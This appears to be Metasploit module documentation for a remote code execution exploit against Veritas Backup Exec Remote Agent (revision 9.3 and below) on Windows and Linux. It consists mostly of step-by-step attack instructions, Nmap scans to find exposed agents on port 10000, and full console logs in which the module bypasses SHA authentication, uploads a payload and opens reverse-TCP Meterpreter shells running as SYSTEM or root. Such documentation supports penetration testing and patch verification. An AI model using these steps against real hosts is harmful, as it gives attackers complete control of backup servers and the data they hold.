## Vulnerable Application

Backup Exec consists of a server component as well as remote agents that are
installed on each host that should be backed up by the server.

There are remote agents available for a range of data sources, including
operating-system level agents for Windows and Linux hosts' local filesystems,
application-specific agents for Microsoft Exchange, SharePoint, Active
Directory, etc., and agents for virtual machines such as VMware or Hyper-V
instances. This exploit targets the Windows and Linux OS-level remote agents.
The agents are installed as services running by default with
`NT AUTHORITY\SYSTEM` or `root` user rights for Windows and Linux respectively.

Vulnerable Backup Exec Remote Agent versions are 9.3 and below. These
agents' versions are distributed with Backup Exec versions 21.1 and below.

A trial version of Backup Exec can be downloaded from Veritas'
[website](https://www.veritas.com/form/trialware/backup-exec).
All supported version of Backup Exec is available in Veritas'
[download center](https://www.veritas.com/content/support/en_US/downloads/).

## Verification Steps

1. Download Backup Exec distributive and install Backup Exec Remote
   Agent on Windows or Linux host.
2. Start `msfconsole`.
3. Select the module and set the address of the host running the remote agent:
```
   use exploit/multi/veritas/beagent_sha_auth_rce
   set RHOSTS [REMOTE_AGENT_HOST]
```
4. Check the service is running and potentially vulnerable with the `check`
   command.
5. Set TARGET (Windows or Linux) depending on operating system on the host
   running the remote agent:
```
   set TARGET [OS_NAME]
```
6. Set and configure preferred payload:
```
   set PAYLOAD [PAYLOAD_NAME]
   set LHOST [LOCAL_IP]
   set LPORT [LOCAL_PORT]
```
7. If Backup Exec Remote Agent run on the Linux then set preferred interpreter
   to execute the command (by default, `/bin/bash`). The option does not matter
   for Windows hosts since the command will always be executed using
   `C:\Windows\System32\cmd.exe`.
```
   set INTERPRETER [INTERPRETER_NAME]
```
8. Start the module using the `exploit` command.
9. Enjoy the received shell.

An example session is as follows:

```
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > use exploit/multi/veritas/beagent_sha_auth_rce
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set RHOSTS 172.16.180.141
RHOSTS => 172.16.180.141
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > check

[*] 172.16.180.141:10000 - Checking vulnerability
[*] 172.16.180.141:10000 - Connecting to BE Agent service
[*] 172.16.180.141:10000 - Getting supported authentication types
Supported authentication by BE agent: BEWS2 (190), SHA (5), SSPI (4)
BE agent revision: 9.3
[*] 172.16.180.141:10000 - The target appears to be vulnerable. SHA authentication is enabled
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set TARGET Windows
TARGET => Windows
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set LHOST 172.16.180.248
LHOST => 172.16.180.248
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > show options 

Module options (exploit/multi/veritas/beagent_sha_auth_rce):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   172.16.180.141   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    10000            yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addr
                                       esses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.180.248   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(multi/veritas/beagent_sha_auth_rce) > run

[*] Started reverse TCP handler on 172.16.180.248:4444 
[*] 172.16.180.141:10000 - Exploiting ...
[*] 172.16.180.141:10000 - Connecting to BE Agent service
[*] 172.16.180.141:10000 - Enabling TLS for NDMP connection
[*] 172.16.180.141:10000 - Passing SHA authentication
[*] 172.16.180.141:10000 - Uploading payload with NDMP_FILE_WRITE packet
[*] Sending stage (175686 bytes) to 172.16.180.141
[*] Meterpreter session 1 opened (172.16.180.248:4444 -> 172.16.180.141:49630) at 2022-09-12 01:44:44 +0300

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

```

## Options

### INTERPRETER
The command line interpreter for executing Linux OS command. By default, the option is
`/bin/bash`. For Windows the option does not matter and the command will always be
executed using `C:\Windows\System32\cmd.exe`.

## Scenarios

The Backup Exec Remote Agent is installed on each host that has local filesystems
that should be backed up. These agents listen on the network for NDMP connections
(10000/tcp), appearing in Nmap scans with scripts enabled as follows:

```
$ nmap -p10000 -n 172.16.180.0/24 --open -vvv
...
Discovered open port 10000/tcp on 172.16.180.133
Discovered open port 10000/tcp on 172.16.180.132
Discovered open port 10000/tcp on 172.16.180.141
...
$ nmap -p10000 -n -sV 172.16.180.133
...
10000/tcp open  ndmp    Symantec/Veritas Backup Exec ndmp (NDMPv3)
...
```

(Note that the `ndmp-version` script fails to execute due to not sending an
`NDMP_CONNECT_OPEN` request before querying version information with the
`NDMP_CONFIG_GET_HOST_INFO` request. This exploit module's `check` command will
carry this query out successfully.)

### Windows; Backup Exec 21.0 (Backup Exec Remote Agent, revision 9.3)
```
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > use exploit/multi/veritas/beagent_sha_auth_rce
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set RHOSTS 172.16.180.141
RHOSTS => 172.16.180.141
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > check

[*] 172.16.180.141:10000 - Checking vulnerability
[*] 172.16.180.141:10000 - Connecting to BE Agent service
[*] 172.16.180.141:10000 - Getting supported authentication types
Supported authentication by BE agent: BEWS2 (190), SHA (5), SSPI (4)
BE agent revision: 9.3
[*] 172.16.180.141:10000 - The target appears to be vulnerable. SHA authentication is enabled
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set TARGET Windows
TARGET => Windows
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set LHOST 172.16.180.248
LHOST => 172.16.180.248
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > show options 

Module options (exploit/multi/veritas/beagent_sha_auth_rce):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   172.16.180.141   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    10000            yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.180.248   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(multi/veritas/beagent_sha_auth_rce) > run

[*] Started reverse TCP handler on 172.16.180.248:4444 
[*] 172.16.180.141:10000 - Exploiting ...
[*] 172.16.180.141:10000 - Connecting to BE Agent service
[*] 172.16.180.141:10000 - Enabling TLS for NDMP connection
[*] 172.16.180.141:10000 - Passing SHA authentication
[*] 172.16.180.141:10000 - Uploading payload with NDMP_FILE_WRITE packet
[*] Sending stage (175686 bytes) to 172.16.180.141
[*] Meterpreter session 2 opened (172.16.180.248:4444 -> 172.16.180.141:49630) at 2022-09-12 01:44:44 +0300

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

### Linux; Backup Exec 16.0 (Backup Exec Remote Agent, revision 9.2)
```
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > use exploit/multi/veritas/beagent_sha_auth_rce
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set RHOSTS 172.16.180.136
RHOSTS => 172.16.180.136
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > check

[*] 172.16.180.136:10000 - Checking vulnerability
[*] 172.16.180.136:10000 - Connecting to BE Agent service
[*] 172.16.180.136:10000 - Getting supported authentication types
Supported authentication by BE agent: BEWS2 (190), SHA (5)
BE agent revision: 9.2
[*] 172.16.180.136:10000 - The target appears to be vulnerable. SHA authentication is enabled
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set TARGET Linux
TARGET => Linux
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set LHOST 172.16.180.248
LHOST => 172.16.180.248
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set INTERPRETER /bin/bash
INTERPRETER => /bin/bash
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > show options 

Module options (exploit/multi/veritas/beagent_sha_auth_rce):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   INTERPRETER  /bin/bash        yes       The command line interpreter for executing OS command
   RHOSTS       172.16.180.136   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        10000            yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.180.248   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux


msf6 exploit(multi/veritas/beagent_sha_auth_rce) > run

[*] Started reverse TCP handler on 172.16.180.248:4444 
[*] 172.16.180.136:10000 - Exploiting ...
[*] 172.16.180.136:10000 - Connecting to BE Agent service
[*] 172.16.180.136:10000 - Enabling TLS for NDMP connection
[*] 172.16.180.136:10000 - Passing SHA authentication
[*] 172.16.180.136:10000 - Uploading payload with CmdStager
[*] 172.16.180.136:10000 - Command Stager progress -  39.74% done (302/760 bytes)
[*] Sending stage (989032 bytes) to 172.16.180.136
[*] 172.16.180.136:10000 - Command Stager progress - 100.00% done (760/760 bytes)
[*] Meterpreter session 3 opened (172.16.180.248:4444 -> 172.16.180.136:49264) at 2022-09-12 01:52:35 +0300

meterpreter > getuid
Server username: root
meterpreter > 
```

### Windows; Backup Exec 21.2 (Backup Exec Remote Agent, revision 9.4) - NOT VULNERABLE
```
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > use exploit/multi/veritas/beagent_sha_auth_rce
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > set RHOSTS 172.16.180.140
RHOSTS => 172.16.180.140
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > check

[*] 172.16.180.140:10000 - Checking vulnerability
[*] 172.16.180.140:10000 - Connecting to BE Agent service
[*] 172.16.180.140:10000 - Getting supported authentication types
Supported authentication by BE agent: BEWS2 (190), SSPI (4)
BE agent revision: 9.4
[*] 172.16.180.140:10000 - The target is not exploitable. SHA authentication is disabled
msf6 exploit(multi/veritas/beagent_sha_auth_rce) > show options 

Module options (exploit/multi/veritas/beagent_sha_auth_rce):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  172.16.180.140   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   10000            yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.180.248   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(multi/veritas/beagent_sha_auth_rce) > run

[*] Started reverse TCP handler on 172.16.180.248:4444 
[*] 172.16.180.140:10000 - Exploiting ...
[*] 172.16.180.140:10000 - Connecting to BE Agent service
[*] 172.16.180.140:10000 - Enabling TLS for NDMP connection
[*] 172.16.180.140:10000 - Passing SHA authentication
[-] 172.16.180.140:10000 - Can not authenticate with SHA. Error code of NDMP_CONFIG_GET_AUTH_ATTR (0x103) packet: 9
[*] Exploit completed, but no session was created.
```
